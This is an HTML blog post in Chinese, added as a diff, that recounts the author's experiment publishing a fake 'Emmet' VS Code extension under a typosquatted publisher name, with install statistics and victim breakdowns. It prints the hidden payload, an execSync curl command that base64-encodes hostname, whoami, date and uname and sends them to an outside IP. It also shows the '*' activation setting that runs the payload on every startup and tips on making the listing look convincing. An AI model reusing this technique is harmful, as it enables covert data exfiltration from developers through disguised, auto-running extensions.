@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width">
+	<title>vscode extension 钓鱼 &ndash; # alert`D0n9` ｜ 输攻墨守</title>
+	<link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/nav.css">
+    
+    
+    
+    
+    
+	<link rel="stylesheet" href="/css/themes/light.css">
+</head>
+<body>
+	<input class="show-hide-menu-input" style="display:none;" autocomplete="off" type="checkbox" id="toggle-1">
+	<label class="overlay" for="toggle-1"></label>
+	<div class="main">
+		<header class="header">
+			<div class="header-content">
+				<div class="title">
+					<a href="http://localhost:1313/"># alert`D0n9` ｜ 输攻墨守</a>
+				</div>
+				<div>
+					<div class="header-right">
+						<label id="show-hide-menu-label" class="clickable-header-label" for="toggle-1">
+							<img class="color-adapting-image" width="30" src="/images/hamburger.svg" alt="menu button">
+						</label>
+					</div>
+					<div class="dont-show">
+						<p>
+							Links:
+						</p>
+					</div>
+					<ul class="links">
+						<li><a href="/">Home</a></li>
+						<li><a href="/posts/">Posts</a></li>
+						<li><a href="/about-me/">About Me</a></li>
+						<li><a href="/tags/">Tags</a></li>
+					</ul>
+				</div>
+			</div>
+		</header>
+		<main class="body">
+			<div class="body-content">
+  <header class="title-header">
+    <h1>vscode extension 钓鱼</h1>
+    <div class="title-header-date">
+        <time>Wednesday, January 17, 2018</time>
+    </div>
+    
+  </header>
+  <p>灵感来源于fate0这篇 <a href="http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;isappinstalled=0">Package 钓鱼</a></p>
+<p>随想做一次针对开发者的“钓鱼”实验，编程语言模块库的钓鱼实验fate0和ztz已经做过了，所以这次把实验对象选择编辑器(IDE)</p>
+<p>$5买了一台廉价vps用作收集用户数据，收集以下信息。</p>
+<p>· hostname
+· whoami
+· date
+· uname
+· ip</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span> <span class="n">desc</span> <span class="n">db</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">+----------+-----------------+------+-----+---------+----------------+</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">Field</span>    <span class="o">|</span> <span class="n">Type</span>            <span class="o">|</span> <span class="n">Null</span> <span class="o">|</span> <span class="n">Key</span> <span class="o">|</span> <span class="n">Default</span> <span class="o">|</span> <span class="n">Extra</span>          <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">+----------+-----------------+------+-----+---------+----------------+</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">id</span>       <span class="o">|</span> <span class="ne">int</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">unsigned</span> <span class="o">|</span> <span class="n">NO</span>   <span class="o">|</span> <span class="n">PRI</span> <span class="o">|</span> <span class="n">NULL</span>    <span class="o">|</span> <span class="n">auto_increment</span> <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">hostname</span> <span class="o">|</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>     <span class="o">|</span> <span class="n">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="n">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">whoami</span>   <span class="o">|</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>     <span class="o">|</span> <span class="n">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="n">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">date</span>     <span class="o">|</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>     <span class="o">|</span> <span class="n">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="n">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">uname</span>    <span class="o">|</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>     <span class="o">|</span> <span class="n">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="n">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ide</span>      <span class="o">|</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>     <span class="o">|</span> <span class="n">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="n">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ip</span>       <span class="o">|</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>     <span class="o">|</span> <span class="n">NO</span>   <span class="o">|</span>     <span class="o">|</span> <span class="n">NULL</span>    <span class="o">|</span>                <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">+----------+-----------------+------+-----+---------+----------------+</span>
+</span></span></code></pre></div><p>获取ip方式使用$_SERVER[&ldquo;REMOTE_ADDR&rdquo;]; 所以可能会不准确。</p>
+<p>好了，回到主题</p>
+<p>选择制作Visual Stuio Code的“恶意”插件，需要用到的工具是 Yeoman 和 vsce</p>
+<blockquote>
+<p>npm install -g yo generator-code
+npm install -g vsce</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171711764.jpg" alt=""></p>
+<p>选择TypeScript语言作为插件的代码语言，可以导入Node.js进程通信模块<strong>import { execSync } from &lsquo;child_process&rsquo;;</strong>，就可以使用exec() execSync() 执行命令</p>
+<p>./test/src/extension.ts</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="nf">execSync</span><span class="p">(</span><span class="s1">&#39;curl &#34;http://45.32.40.141/&#34; --user-agent &#34;$(echo `hostname`, `whoami`, `date &#34;+%Y-%m-%d %H:%M:%S&#34;`, `uname`, vscode | base64)&#34;&#39;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></div><p>执行curl命令外带出数据，有个不足没有考虑Windows系统，这也是导致了最后插件安装量很大但是实际有效数据不多的原因。</p>
+<p>考虑再三还是把命令硬编码在代码里，因为只是一次实验，如果下发脚本的方式就会被当作真的是恶意程序</p>
+<p>还有一个知识点，vscode启动默认是不加载插件的，这是因为官方考虑到加载插件会拖慢启动速度，只有设置触发条件才会启动</p>
+<p>./test/src/package.json</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;activationEvents&#34;: [
+</span></span><span class="line"><span class="cl">    &#34;onCommand:extension.sayHello&#34;
+</span></span><span class="line"><span class="cl">],
+</span></span></code></pre></div><p>改为</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;activationEvents&#34;: [
+</span></span><span class="line"><span class="cl">    &#34;*&#34;,
+</span></span><span class="line"><span class="cl">    &#34;onCommand:extension.sayHello&#34;
+</span></span><span class="line"><span class="cl">],
+</span></span></code></pre></div><p>星号表示任何情况下都会触发，就这么简单，一个恶意的插件就做好了，当然为了使之更加逼真还要增加一些迷惑性的内容，比如README.md最好图文并茂，再给插件设置一张icon，就可以上传到 <a href="https://marketplace.visualstudio.com">https://marketplace.visualstudio.com</a> 了，几分钟就审核通过，那肯定是自动审核了</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171712923.jpg" alt=""></p>
+<p>可能是因为Emmet知名度太高（用过sublime的小伙伴肯定知道这个插件）”恶意“插件上架仅两天就有了二十九万的安装量，后来发现竟然还上了首页热门推荐，这是意想不到的，起初还在担心如果不可控了咋办，最后证明这个担心是多余的，XDD</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171712558.jpg" alt=""></p>
+<p>当然也不是那么顺利，因为插件并没有实际功能，还是被几位外国人识破举报了，周二一早就被官方下架了，从周六到周二仅持续了三天时间，相信如果是在正常插件中加入恶意代码肯定会潜伏更长更不易被发现。</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171712534.jpg" alt=""></p>
+<p>但是在下架的时候已经有了367004次的安装量 <a href="https://marketplace.visualstudio.com/items?itemName=visualstuiocode.emmet#overview">https://marketplace.visualstudio.com/items?itemName=visualstuiocode.emmet#overview</a></p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171712330.jpg" alt=""></p>
+<p>因为每次启动都会加载插件执行命令，所以上报的数据需要去重，hostname 加 whoami hash 后当作 uid 去重统计操作系统占比，可以看出other数量最多，这部分可能是Windows或是其他原因没有上报数据</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171713095.jpg" alt=""></p>
+<p>中招最多的国家top10，数据验证使用 <a href="http://ip.taobao.com/service/getIpInfo.php">http://ip.taobao.com/service/getIpInfo.php</a></p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2018/01/202402171713536.jpg" alt=""></p>
+<p>思考，是什么原因导致三天达到三十几万的安装量呢？</p>
+<p>这个锅官方是背定了，因为官方审核机制不严格，spam 不及时，甚至还登上了首页热门推荐两天才导致大量安装，后续没有补救措施，对于已经安装了恶意插件的用户没有提示告知，只对插件做了下架处理，原本已经安装的用户还是会受影响。</p>
+<p>ide有那么多，sublime 是使用Python写插件，JetBrains家和Eclipse用Java，Notepad++用c++，都可以按照类似思路构造出恶意插件。</p>
+<p>未来会不会再出现xcodeghost事件呢？拭目以待。</p>
+<p>ref：</p>
+<p><a href="https://zh.wikipedia.org/wiki/XcodeGhost%E9%A3%8E%E6%B3%A2">https://zh.wikipedia.org/wiki/XcodeGhost%E9%A3%8E%E6%B3%A2</a>
+<a href="http://imzc.me/tools/2016/10/13/getting-started-with-vscode-ext/">http://imzc.me/tools/2016/10/13/getting-started-with-vscode-ext/</a>
+<a href="https://code.visualstudio.com/docs/extensions/overview">https://code.visualstudio.com/docs/extensions/overview</a>
+<a href="http://nodejs.cn/api/child_process.html">http://nodejs.cn/api/child_process.html</a>
+<a href="http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;isappinstalled=0">http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;isappinstalled=0</a></p>
+
+  
+  
+  <div class="post-tags">
+    <p>Tags: 
+    
+      <a href="/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6">社会工程学</a>
+    
+      <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97">红蓝对抗</a>
+    
+      <a href="/tags/vscode">VSCode</a>
+    
+      <a href="/tags/%E9%92%93%E9%B1%BC">钓鱼</a>
+    
+    </p>
+  </div>
+  
+
+			</div>
+		</main>
+	</div>
+	<hr class="dont-show">
+	<footer class="footer">
+		<p>Powered by <a href="https://gohugo.io/">Hugo</a> &amp; <a href="https://github.com/stevenengler/no-js-hugo-theme">no-js-hugo-theme</a></p>
+	</footer>
+</body>
+</html>
